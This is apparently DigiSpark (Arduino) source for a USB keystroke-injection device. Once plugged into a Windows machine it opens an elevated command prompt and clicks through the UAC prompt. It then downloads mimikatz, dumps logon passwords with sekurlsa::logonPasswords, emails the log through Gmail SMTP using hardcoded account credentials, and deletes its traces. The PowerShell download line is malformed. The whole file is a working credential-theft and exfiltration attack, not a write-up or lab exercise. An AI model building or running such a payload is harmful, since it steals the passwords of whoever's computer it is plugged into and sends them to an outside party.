#include "DigiKeyboard.h"
#define KEY_UP_ARROW     0x52
#define KEY_DOWN_ARROW   0x51
#define KEY_LEFT_ARROW   0x50
#define KEY_RIGHT_ARROW  0x4F
#define KEY_LEFT_GUI     0xE3
#define KEY_ESC          0x29
#define KEY_HOME         0x4A
#define KEY_INSERT       0x49
#define KEY_NUM_LOCK     0x53
#define KEY_SCROLL_LOCK  0x47
#define KEY_CAPS_LOCK  0x39
#define KEY_TAB          0x2B

void digiBegin() {
  DigiKeyboard.sendKeyStroke(0,0);
  DigiKeyboard.delay(50);
}

void digiEnd() {
  const int led=1;
  pinMode(led, OUTPUT);
  while (1) {
    digitalWrite(led, !digitalRead(led));
    DigiKeyboard.delay(1000);
  }
}

void printText(fstr_t *txt) {
  DigiKeyboard.print(txt);
  DigiKeyboard.update();
}

void setup() {
  digiBegin();
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ESC, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(1000);
  printText(F("cmd.exe"));
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT|MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  // -------------download appropriate mimikatz for architecture
  printText(F("powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20181209/mimikatz_trunk.zip','%TEMP%\\pw.exe') , '%TEMP%\\pw.exe');}"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  // -------------get the passwords and save to c:\pwlog.txt
  printText(F("%TEMP%\\pw.exe > c:\\pwlog.txt & type pwlog.txt;"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  printText(F("privilege::debug"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  printText(F("sekurlsa::logonPasswords full"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  printText(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  printText(F("del %TEMP%\\pw.exe"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  // -------------email log via gmail
  printText(F("powershell"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  printText(F("$SMTPServer = 'smtp.gmail.com'"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  printText(F("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  printText(F("$SMTPInfo.EnableSsl = $true"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  printText(F("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('cybersomething1@gmail.com', 'cadets23019953');"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  printText(F("$ReportEmail = New-Object System.Net.Mail.MailMessage"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  printText(F("$ReportEmail.From = 'sending email account'"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  printText(F("$ReportEmail.To.Add('email account to send report')"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  printText(F("$ReportEmail.Subject = 'Duck Report'"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  printText(F("$ReportEmail.Body = 'Attached is your duck report.'"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  printText(F("$ReportEmail.Attachments.Add('c:\\pwlog.txt')"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  printText(F("$SMTPInfo.Send($ReportEmail)"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  printText(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  // ---------------------delete and end
  printText(F("del c:\\pwlog.txt"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300);
  printText(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digiEnd();
}

/* Unused endless loop */
void loop() {}
